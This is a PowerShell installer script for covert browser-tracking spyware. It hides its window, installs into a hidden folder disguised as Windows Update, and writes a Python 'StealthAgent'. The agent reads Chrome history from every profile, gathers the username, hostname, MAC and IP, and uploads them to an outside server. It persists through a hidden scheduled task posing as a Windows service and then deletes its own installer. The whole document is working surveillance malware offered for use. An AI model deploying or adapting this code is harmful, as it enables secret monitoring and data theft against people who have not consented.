# Browser Tracking Silent Installer
# Run with: powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File silent_installer.ps1

param(
    [string]$ServerUrl = "https://browser-tracking.vercel.app",
    [string]$ApiToken = "BrowserTracker2024SecureToken"
)

# Hide PowerShell window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) # 0 = hide

# Configuration
$InstallPath = "$env:LOCALAPPDATA\WindowsUpdate"  # Disguised as Windows Update
$ServiceName = "WindowsUpdateService"
$LogFile = "$InstallPath\update.log"

# Create installation directory (hidden)
if (-not (Test-Path $InstallPath)) {
    New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    # Set hidden attribute
    (Get-Item $InstallPath).Attributes = 'Hidden'
}

# Function to write log silently
function Write-SilentLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8
}

Write-SilentLog "Starting silent installation..."

# Check if Python is installed
$pythonPath = $null
$pythonPaths = @(
    "python",
    "py",
    "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
    "$env:PROGRAMFILES\Python311\python.exe"
)

foreach ($path in $pythonPaths) {
    try {
        $result = & $path --version 2>$null
        if ($LASTEXITCODE -eq 0) {
            $pythonPath = $path
            Write-SilentLog "Found Python: $result"
            break
        }
    } catch {
        continue
    }
}

# Install Python silently if not found
if (-not $pythonPath) {
    Write-SilentLog "Python not found, installing silently..."
    
    $pythonUrl = "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
    $pythonInstaller = "$env:TEMP\python_installer.exe"
    
    try {
        # Download Python installer
        Invoke-WebRequest -Uri $pythonUrl -OutFile $pythonInstaller -UseBasicParsing
        
        # Install Python silently
        Start-Process -FilePath $pythonInstaller -ArgumentList @(
            "/quiet",
            "InstallAllUsers=0",
            "PrependPath=1",
            "Include_test=0",
            "Include_doc=0",
            "Include_dev=0"
        ) -Wait -WindowStyle Hidden
        
        # Clean up installer
        Remove-Item $pythonInstaller -Force
        
        # Update PATH and find Python
        $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH", "User")
        $pythonPath = "python"
        
        Write-SilentLog "Python installed successfully"
    } catch {
        Write-SilentLog "Failed to install Python: $($_.Exception.Message)"
        exit 1
    }
}

# Create agent files
$agentFiles = @{
    "agent.py" = @"
import os
import sys
import json
import time
import schedule
import threading
import requests
import sqlite3
import shutil
import tempfile
from datetime import datetime, timezone
import socket
import getpass
import platform
from uuid import getnode

# Configuration
CONFIG = {
    "server_url": "$ServerUrl",
    "api_token": "$ApiToken",
    "check_interval": 300,
    "batch_size": 50,
    "stealth_mode": True
}

class StealthAgent:
    def __init__(self):
        self.client_id = None
        self.running = False
        
    def get_system_info(self):
        try:
            mac = getnode()
            mac_address = ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            return {
                'hostname': socket.gethostname(),
                'mac_address': mac_address,
                'local_ip': local_ip,
                'username': getpass.getuser(),
                'os_info': {
                    'system': platform.system(),
                    'release': platform.release(),
                    'version': platform.version()
                }
            }
        except:
            return None
    
    def get_chrome_history(self):
        try:
            chrome_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
            if not os.path.exists(chrome_path):
                return []
            
            history_entries = []
            
            # Check Default profile
            profiles = ['Default']
            for item in os.listdir(chrome_path):
                if item.startswith('Profile '):
                    profiles.append(item)
            
            for profile in profiles:
                profile_path = os.path.join(chrome_path, profile)
                history_db = os.path.join(profile_path, 'History')
                
                if not os.path.exists(history_db):
                    continue
                
                try:
                    # Copy database to temp location
                    with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                        temp_db = temp_file.name
                    
                    shutil.copy2(history_db, temp_db)
                    
                    # Read history
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute('''
                        SELECT url, title, visit_count, last_visit_time
                        FROM urls
                        WHERE last_visit_time > 0
                        ORDER BY last_visit_time DESC
                        LIMIT 50
                    ''')
                    
                    for row in cursor.fetchall():
                        url, title, visit_count, chrome_time = row
                        
                        if chrome_time > 0:
                            unix_timestamp = (chrome_time - 11644473600000000) / 1000000
                            visit_time = datetime.fromtimestamp(unix_timestamp, tz=timezone.utc)
                        else:
                            visit_time = datetime.now(tz=timezone.utc)
                        
                        history_entries.append({
                            'url': url,
                            'title': title or '',
                            'visit_time': visit_time.isoformat(),
                            'browser_type': 'Chrome',
                            'profile_name': profile
                        })
                    
                    conn.close()
                    os.unlink(temp_db)
                    
                except:
                    continue
            
            return history_entries[:CONFIG['batch_size']]
            
        except:
            return []
    
    def send_data(self, endpoint, data):
        try:
            headers = {
                'Authorization': f'Bearer {CONFIG["api_token"]}',
                'Content-Type': 'application/json'
            }
            
            response = requests.post(
                f'{CONFIG["server_url"]}/api/{endpoint}',
                json=data,
                headers=headers,
                timeout=30
            )
            
            return response.status_code == 200
        except:
            return False
    
    def register_client(self):
        system_info = self.get_system_info()
        if not system_info:
            return False
        
        if self.send_data('register', system_info):
            # Get client_id from response (simplified)
            self.client_id = 1  # In real implementation, parse from response
            return True
        return False
    
    def collect_and_send(self):
        if not self.client_id:
            if not self.register_client():
                return
        
        history = self.get_chrome_history()
        if history:
            self.send_data('browsing-data', {
                'client_id': self.client_id,
                'browsing_data': history
            })
    
    def run(self):
        self.running = True
        
        # Initial collection
        self.collect_and_send()
        
        # Schedule periodic collection
        schedule.every(CONFIG['check_interval']).seconds.do(self.collect_and_send)
        
        while self.running:
            try:
                schedule.run_pending()
                time.sleep(60)  # Check every minute
            except:
                time.sleep(60)

if __name__ == '__main__':
    agent = StealthAgent()
    agent.run()
"@

    "requirements.txt" = @"
requests==2.31.0
schedule==1.2.0
"@

    "config.json" = @"
{
    "server_url": "$ServerUrl",
    "api_token": "$ApiToken",
    "stealth_mode": true,
    "check_interval": 300
}
"@
}

# Write agent files
foreach ($fileName in $agentFiles.Keys) {
    $filePath = Join-Path $InstallPath $fileName
    $agentFiles[$fileName] | Out-File -FilePath $filePath -Encoding UTF8
    Write-SilentLog "Created $fileName"
}

# Install Python dependencies silently
try {
    $requirementsPath = Join-Path $InstallPath "requirements.txt"
    & $pythonPath -m pip install -r $requirementsPath --quiet --no-warn-script-location 2>$null
    Write-SilentLog "Dependencies installed"
} catch {
    Write-SilentLog "Failed to install dependencies: $($_.Exception.Message)"
}

# Create Windows service/scheduled task
$taskName = "WindowsUpdateService"
$agentPath = Join-Path $InstallPath "agent.py"

# Remove existing task if exists
schtasks /delete /tn $taskName /f 2>$null

# Create scheduled task to run at startup and every 5 minutes
$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
      </Repetition>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions>
    <Exec>
      <Command>$pythonPath</Command>
      <Arguments>"$agentPath"</Arguments>
      <WorkingDirectory>$InstallPath</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@

$taskXmlPath = "$env:TEMP\task.xml"
$taskXml | Out-File -FilePath $taskXmlPath -Encoding UTF8

try {
    schtasks /create /tn $taskName /xml $taskXmlPath /f | Out-Null
    Remove-Item $taskXmlPath -Force
    Write-SilentLog "Scheduled task created successfully"
} catch {
    Write-SilentLog "Failed to create scheduled task: $($_.Exception.Message)"
}

# Start the service immediately
try {
    schtasks /run /tn $taskName | Out-Null
    Write-SilentLog "Service started"
} catch {
    Write-SilentLog "Failed to start service: $($_.Exception.Message)"
}

Write-SilentLog "Silent installation completed successfully"

# Self-destruct installer
Start-Sleep -Seconds 2
Remove-Item $MyInvocation.MyCommand.Path -Force 2>$null
